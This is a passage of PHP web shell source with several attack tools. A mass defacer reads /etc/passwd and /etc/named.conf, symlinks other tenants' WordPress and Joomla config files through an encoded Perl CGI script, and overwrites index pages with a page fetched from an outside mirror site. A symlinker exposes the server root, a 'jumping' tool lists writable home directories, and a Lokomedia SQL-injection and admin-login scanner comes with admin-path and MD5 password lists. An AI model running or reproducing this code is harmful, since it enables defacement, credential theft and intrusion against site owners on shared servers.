count($out[1]);echo "Total domains: $numero_dominios <br><br />";$def = file_get_contents($def_url);$def = urlencode($def);$dd = 'PD9waHANCiRkZWYgPSBmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3pvbmVobWlycm9ycy5vcmcvZGVmYWNlZC8yMDEzLzAzLzE5L2Fzc29jaWFwcmVzcy5uZXQnKTsNCiRwID0gZXhwbG9kZSgncHVibGljX2h0bWwnLGRpcm5hbWUoX19GSUxFX18pKTsNCiRwID0gJHBbMF0uJ3B1YmxpY19odG1sJzsNCmlmICgkaGFuZGxlID0gb3BlbmRpcigkcCkpIHsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXguaHRtbCcsJ3crJyk7DQogICAgQGZ3cml0ZSgkZnAxLCAkZGVmKTsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXgucGhwJywndysnKTsNCiAgICBAZndyaXRlKCRmcDEsICRkZWYpOw0KICAgICRmcDEgPSBAZm9wZW4oJHAuJy9pbmRleC5odG0nLCd3KycpOw0KICAgIEBmd3JpdGUoJGZwMSwgJGRlZik7DQogICAgZWNobyAnRG9uZSc7DQp9DQpjbG9zZWRpcigkaGFuZGxlKTsNCnVubGluayhfX0ZJTEVfXyk7DQo/Pg==';$base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/sym/root/home/';$output = fopen('defaced.html', 'a+');$_SESSION['count1'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count1']) ? $_SESSION['count1'] :0 ) : 0;$_SESSION['count2'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count2']) ? $_SESSION['count2'] :0 ) : 0;echo '<table style="width:75%;" align="center"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$st = (isset($_GET['st']) && $_GET['st']!='') ? $_GET['st'] : 0;for($i = $st; $i <= $numero_dominios; $i++){$domain = $out[1][$i];$dono_arquivo = @fileowner("/etc/valiases/".$domain);$infos = @posix_getpwuid($dono_arquivo);if($infos['name']!='root') {$config01 = @file_get_contents($base_url.$infos['name']."/public_html/configuration.php");$config02 = @file_get_contents($base_url.$infos['name']."/public_html/wp-config.php");$config03 = @file_get_contents($base_url.$infos['name']."/public_html/blog/wp-config.php");$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count1'] = $_SESSION['count1'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $dd);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count2'] = $_SESSION['count2'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config03 && preg_match('/DB_NAME/i',$config03)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config03, $dd);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count2'] = $_SESSION['count2'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($_SESSION['count1']+$_SESSION['count2']).' (JOOMLA = '.$_SESSION['count1'].', WORDPRESS = '.$_SESSION['count2'].')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($_SESSION['count1']+$_SESSION['count2'] > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}function exec_mode_2($def_url) {$domains = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);$out = array_unique($out[1]);$num = count($out);print("Total domains: $num<br><br />");$def = file_get_contents($def_url);$def = urlencode($def);$output = fopen('defaced.html', 'a+');$defaced = '';$count1 = 0;$count2 = 0;echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$map = array();foreach($out as $d) {$info = @posix_getpwuid(fileowner("/etc/valiases/".$d));$map[$info['name']] = $d;}$dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHdkfTs
   NCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2
   h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19od
   G1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwv
   YmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRklMRSwgJy9ldGMvcGFzc3d
   kJyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPCR5OyRrYSsrKXsNCiAgIC
   B3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_contents('plsym/plsym.cc', base64_decode($dt));chmod('plsym/plsym.cc', 0755);$wr  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";$fp = @fopen ('plsym/.htaccess','w');fwrite($fp, $wr);fclose($fp);$res = file_get_contents('http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/plsym.cc');  $url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/';unlink('plsym/plsym.cc');$data = file_get_contents($url);preg_match_all('/<a href="(.+)">/', $data, $match);unset($match[1][0]);$i = 1;foreach($match[1] as $m){$mz = explode('##',urldecode($m));$config01 = '';$config02 = '';if($mz[1] == 'joomla.txt') {$config01 = file_get_contents($url.$m);}if($mz[1] == 'wordpress.txt') {$config02 = file_get_contents($url.$m);}$domain = $map[$mz[0]];$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i++.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count1++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $def);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count2++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($count1+$count2 > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}function exec_mode_3($def_url) {$domains = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);$out = array_unique($out[1]);$num = count($out);print("Total domains: $num<br><br />");$def = file_get_contents($def_url);$def = urlencode($def);  $output = fopen('defaced.html', 'a+');$defaced = '';$count1 = 0;$count2 = 0;echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$map = array();foreach($out as $d) {$info = @posix_getpwuid(fileowner("/etc/valiases/".$d));$map[$info['name']] = $d;}$dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHd
   kfTsNCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcH
   VibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL
   3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicv
   cHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRkl
   MRSwgJ2RhdGEudHh0Jyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPC
   R5OyRrYSsrKXsNCiAgICB3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_contents('plsym/data.txt', $_POST['man_data']);file_put_contents('plsym/plsym.cc', base64_decode($dt));chmod('plsym/plsym.cc', 0755);$wr  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";$fp = @fopen ('plsym/.htaccess','w');fwrite($fp, $wr);fclose($fp);$res = file_get_contents('http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/plsym.cc');  $url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/';unlink('plsym/plsym.cc');$data = file_get_contents($url);preg_match_all('/<a href="(.+)">/', $data, $match);unset($match[1][0]);$i=1;foreach($match[1] as $m){$mz = explode('##',urldecode($m));$config01 = '';$config02 = '';if($mz[1] == 'joomla.txt') {$config01 = file_get_contents($url.$m);}if($mz[1] == 'wordpress.txt') {$config02 = file_get_contents($url.$m);}$domain = $map[$mz[0]];$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.($i++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count1++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $def);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count2++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($count1+$count2 > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}echo '<!DOCTYPE html><html><head><link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css"><style type="text/css">.header {position:fixed;width:100%;top:0;background:#000;}.footer {position:fixed;width:100%;bottom:0;background:#000;}input[type="radio"]{margin-top: 0;}.td2 {border-left:1px solid red;border-radius: 2px 2px 2px 2px;}.even {background-color: rgba(25, 25, 25, 0.6);}.odd {background-color: rgba(102, 102, 102, 0.6);}textarea{background: rgba(0,0,0,0.6); color: white;}.green {color:#00FF00;font-weight:bold;}.red {color:#FF0000;font-weight:bold;}</style><script type="text/javascript">function change() {if(document.getElementById(\'rcd\').checked == true) {document.getElementById(\'tra\').style.display = \'\';} else {document.getElementById(\'tra\').style.display = \'none\';}}function hide() {document.getElementById(\'tra\').style.display = \'none\';}</script></head><body><h2 style="font-size:25px;color:#00ff00;text-align: center;font-family:orbitron;text-shadow: 6px 6px 6px black;">Wordpress and Joomla Mass Defacer</h2>';if(!isset($_POST['form_action']) && !isset($_GET['mode'])){echo '<form action="" method="post"><table align=center><tr><td><input type="radio" value="1" name="mode" checked="checked" onclick="hide();"></td><td>using /etc/named.conf ('.(is_readable('/etc/named.conf')?'<span class="green">READABLE</span>':'<span class="red">NOT READABLE</span>').')</td></tr><tr><td><input type="radio" value="2" name="mode" onclick="hide();"></td><td>using /etc/passwd ('.(is_readable('/etc/passwd')?'<span class="green">READABLE</span>':'<span class="red">NOT READABLE</span>').')</td></tr><tr><td><input type="radio" value="2" name="mode" id="rcd" onclick="change();"></td><td>manual copy of /etc/passwd</td></tr><tr id="tra" style="display: none;"><td></td><td><textarea cols="60" rows="10" name="man_data"></textarea></td></tr></table><br><input type="hidden" name="form_action" value="1"><table align=center><tr><td><b>index url: </b><input class="inputz" size="45" type="text" name="defpage" value=""></tr></td></table><center><input class="inputzbut" type="submit" value="Attack !" name="Submit"></center></form>';}$milaf_el_index = $_POST['defpage'];if($_POST['form_action'] == 1) {if($_POST['mode']==1) { exec_mode_1($milaf_el_index); }if($_POST['mode']==2) { exec_mode_2($milaf_el_index); }if($_POST['mode']==3) { exec_mode_3($milaf_el_index); }}if($_GET['mode']==1) { exec_mode_1($milaf_el_index); }echo '</body></html>';
   }
}  elseif($_GET['do'] == 'symser'){
$d0mains = @file("/etc/named.conf");
if($d0mains){@mkdir("/3c",0777);@chdir("/3c");@exe("ln -s / root");$file3 = 'Options all
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any';$fp3 = fopen('.htaccess','w');$fw3 = fwrite($fp3,$file3);@fclose($fp3);echo "<table align=center border=1 style='width:60%;border-color:#333333;'><tr><td align=center><font size=3>S. No.</font></td><td align=center><font size=3>Domains</font></td><td align=center><font size=3>Users</font></td><td align=center><font size=3>Symlink</font></td></tr>";$dcount = 1;foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr align=center><td><font size=3>" . $dcount . "</font></td><td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td><td>".$user['name']."</td><td><a href='/k2/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; flush();$dcount++;}}}echo "</table>";}else{$TEST=@file('/etc/passwd');if ($TEST){@mkdir("k2",0777);@chdir("k2");exe("ln -s / root");$file3 = 'Options all
 DirectoryIndex Sux.html
 AddType text/plain .php
 AddHandler server-parsed .php
  AddType text/plain .html
 AddHandler txt .html
 Require None
 Satisfy Any';$fp3 = fopen('.htaccess','w');$fw3 = fwrite($fp3,$file3);@fclose($fp3);echo "<br><br><table align=center border=1><tr><td align=center><font size=4>S. No.</font></td><td align=center><font size=4>Users</font></td><td align=center><font size=4>Symlink</font></td></tr>";$dcount = 1;$file = fopen("/etc/passwd", "r") or exit("Unable to open file!");while(!feof($file)){$s = fgets($file);$matches = array();$t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")continue;echo "<tr><td align=center><font size=3>" . $dcount . "</td><td align=center><font class=txt>" . $matches . "</td>";echo "<td align=center><font class=txt><a href=/k2/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";$dcount++;}fclose($file);echo "</table>";}else{if($os != "Windows"){@mkdir("k2",0777);@chdir("k2");@exe("ln -s / root");$file3 = 'Options all
 DirectoryIndex Sux.html
 AddType text/plain .php
 AddHandler server-parsed .php
  AddType text/plain .html
 AddHandler txt .html
 Require None
 Satisfy Any';$fp3 = fopen('.htaccess','w');$fw3 = fwrite($fp3,$file3);@fclose($fp3);echo "<br><br><center><h2 class='cgx2'>server symlinker</h2><table align=center border=1><tr><td align=center><font size=4>id</font></td><td align=center><font size=4>Users</font></td><td align=center><font size=4>Symlink</font></td></tr>";$temp = "";$val1 = 0;$val2 = 1000;for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);if ($uid)$temp .= join(':',$uid)."\n";}echo '<br/>';$temp = trim($temp);$file5 = fopen("test.txt","w");fputs($file5,$temp);fclose($file5);$dcount = 1;$file = fopen("test.txt", "r") or exit("Unable to open file!");while(!feof($file)){$s = fgets($file);$matches = array();$t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")continue;echo "<tr><td align=center><font size=3>" . $dcount . "</td><td align=center><font class=txt>" . $matches . "</td>";echo "<td align=center><font class=txt><a href=/k2/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";$dcount++;}fclose($file);echo "</table></center>";unlink("test.txt");} else echo "<center><font size=4>Cannot create Symlink</font></center>";}}
 
 }elseif($_GET['do'] == 'jumping') {
    $i = 0;
    echo "<div class='margin: 5px auto;'>";
    if(preg_match("/hsphere/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace(array("http://","www."), "", strtolower($url));
                $etc = "/etc/passwd";
                $f = fopen($etc,"r");
                while($gets = fgets($f)) {
                    $pecah = explode(":", $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if(is_dir($dir_user) === true) {
                        $url_user = $dir_user."/".$url;
                        if(is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=lime>R</font>] <a href='?bom&folder=$url_user'><font color=gold>$url_user</font></a>";
                            if(is_writable($url_user)) {
                                $jrw = "[<font color=lime>RW</font>] <a href='?bom&folder=$url_user'><font color=gold>$url_user</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
            $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
            while($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } elseif(preg_match("/vhosts/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $web_vh = "/var/www/vhosts/$url/httpdocs";
                if(is_dir($web_vh) === true) {
                    if(is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=lime>R</font>] <a href='?bom&folder=$web_vh'><font color=gold>$web_vh</font></a>";
                        if(is_writable($web_vh)) {
                            $jrw = "[<font color=lime>RW</font>] <a href='?bom&folder=$web_vh'><font color=gold>$web_vh</font></a>";
                        }
                        echo $jrw."<br>";
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
                  bing("ip:$ip");
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } else {
        echo "<pre>";
        $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
        while($passwd = fgets($etc)) {
            if($passwd == '' || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach($user_jumping[1] as $user_ec_jump) {
                    $user_jumping_dir = "/home/$user_ec_jump/public_html";
                    if(is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=lime>R</font>] <a href='?bom&folder=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                        if(is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=lime>RW</font>] <a href='?bom&folder=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if(function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents("/etc/named.conf");   
                            if($domain_jump == '') {
                                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                            } else {
                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                foreach($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if($user_jumping_url == $user_ec_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo "<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
    }
    echo "</div>";
}elseif($_GET['do'] == 'lokmed_login_shell'){
echo'
<html>
<head>
<style type="text/css">
textarea {
    width: 500px;
    height: 200px;
    border: 1px solid #7FFFFF;
    margin: 5px auto;
    padding: 7px;
}
input[type=submit] {
    width: 500px;
    height: 25px;
    border: 1px solid #7FFFFF;
    background: transparent;
    margin: 5px auto;
    background: #7FFFFF;
    color: black;
    cursor: pointer;
}
</style>
</head>
<center>
<h1> Lokomedia SQL-Injection + Scan Admin Login</h1>
<form method="post">
<textarea name="target" placeholder="http://www.target.com/" style="width: 500px; height: 250px;" required></textarea><br>
<input type="submit" name="go" value="Xploit" style="width: 500px;">
</form>
</center>';
function ngcurl($url) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
$admin = array(
'adm/',
'_adm_/',
'_admin_/',
'_administrator_/',
'operator/',
'sika/',
'develop/',
'ketua/',
'redaktur/',
'author',
'admin/',
'administrator/',
'adminweb/',
'user/',
'users/',
'dinkesadmin/',
'retel/',
'author/',
'panel/',
'paneladmin/',
'panellogin/',
'redaksi/',
'cp-admin/',
'master/',
'master/index.php',
'master/login.php',
'operator/index.php',
'sika/index.php',
'develop/index.php',
'ketua/index.php',
'redaktur/index.php',
'admin/index.php',
'administrator/index.php',
'adminweb/index.php',
'user/index.php',
'users/index.php',
'dinkesadmin/index.php',
'retel/index.php',
'author/index.php',
'panel/index.php',
'paneladmin/index.php',
'panellogin/index.php',
'redaksi/index.php',
'cp-admin/index.php',
'operator/login.php',
'sika/login.php',
'develop/login.php',
'ketua/login.php',
'redaktur/login.php',
'admin/login.php',
'administrator/login.php',
'adminweb/login.php',
'user/login.php',
'users/login.php',
'dinkesadmin/login.php',
'retel/login.php',
'author/login.php',
'panel/login.php',
'paneladmin/login.php',
'panellogin/login.php',
'redaksi/login.php',
'cp-admin/login.php',
'terasadmin/',
'terasadmin/index.php',
'terasadmin/login.php',
'rahasia/',
'rahasia/index.php',
'rahasia/admin.php',
'rahasia/login.php',
'dinkesadmin/',
'dinkesadmin/login.php',
'adminpmb/',
'adminpmb/index.php',
'adminpmb/login.php',
'system/',
'system/index.php',
'system/login.php',
'webadmin/',
'webadmin/index.php',
'webadmin/login.php',
'wpanel/',
'wpanel/index.php',
'wpanel/login.php',
'adminpanel/index.php',
'adminpanel/',
'adminpanel/login.php',
'adminkec/',
'adminkec/index.php',
'adminkec/login.php',
'admindesa/',
'admindesa/index.php',
'admindesa/login.php',
'adminkota/',
'adminkota/index.php',
'adminkota/login.php',
'admin123/',
'admin123/index.php',
'admin123/login.php',
'logout/',
'logout/index.php',
'logout/login.php',
'logout/admin.php',
'adminweb_setting',
);
$real_pass = array(
"a66abb5684c45962d887564f08346e8d" => "admin123456",
"99026ab4ab3de96f3d7ae33c8c85057b" => "master!@#$qwe",
"c630643500720b255abb22e2ab2c31f6" => "sumedang123",
"1c63129ae9db9c60c3e8aa94d3e00495" => "1qaz2wsx", 
"f243df64be7184fb0fc07bd6cf53185b" => "b1smillah",
"93261ae77f0df5522dd9767203f3aa17" => "house69",
"f243df64be7184fb0fc07bd6cf53185b" => "b1smillah",
"37c77ada62ec68d1b740717fc886bef6" => "Suk4bum1",
"d39b59b946b414c4e5926f9c7b23840a" => "kasitaugakya",
"fbff29af096fa646757ce8439b644714" => "vro190588",
"1feadc10e93f2b64c65868132f1e72d3" => "agoes",
"0192023a7bbd73250516f069df18b500" => "admin123",
"7aa1dfee8619ac8f282e296d83eb55ff" => "meong",
"24fa5ee2c1285e115dd6b5fe1c25a333" => "773062",
"d557fd4686821b5d8b927cdfe6e67d21" => "#admin#",
"5fec4ba8376f207d1ff2f0cac0882b01" => "admin!@#",
"a01726b559eeeb5fc287bf0098a22f6c" => "@dm1n",
"73acd9a5972130b75066c82595a1fae3" => "ADMIN",
"511f2efed0e465e700a951f2f1ecec19" => "bs1unt46",
"7b7bc2512ee1fedcd76bdc68926d4f7b" => "Administrator",
"99fedb09f0f5da90e577784e5f9fdc23" => "ADMINISTRATOR",
"e58bfd635502ea963e1d52487ac2edfa" => "!@#123!@#123",
"5449ccea16d1cc73990727cd835e45b5" => "ngadimin",
"c21f969b5f03d33d43e04f8f136e7682" => "default",
"1a1dc91c907325c69271ddf0c944bc72" => "pass",
"fffdf0489f264598e9d35cba0381e9ac" => "sukmapts",
"5f4dcc3b5aa765d61d8327deb882cf99" => "password",
"5ebe2294ecd0e0f08eab7690d2a6ee69" => "secret",
"c893bad68927b457dbed39460e6afd62" => "prueba",
"b2ca9cfa6067282a031d28a54886822d" => "admin4343",
"3a3795bb61d5377545b4f345ff223e3d" => "bingo",
"e172dd95f4feb21412a692e73929961e" => "bismillah",
"8221303fbf816fd9da96be7dd4c92f99" => "salawarhandap123",
"0570e3795fbe97ddd3ce53be141d1aed" => "indoxploit",
"098f6bcd4621d373cade4e832627b4f6" => "test",   
"976adc43eaf39b180d9f2c624a1712cd" => "adminppcp",
"5985609a2dc01098797c94a43e0a1115" => "masarief",
"21232f297a57a5a743894a0e4a801fc3" => "admin",
"1870a829d9bc69abf500eca6f00241fe" => "wordpress",
"126ac9f6149081eb0e97c2e939eaad52" => "blog",
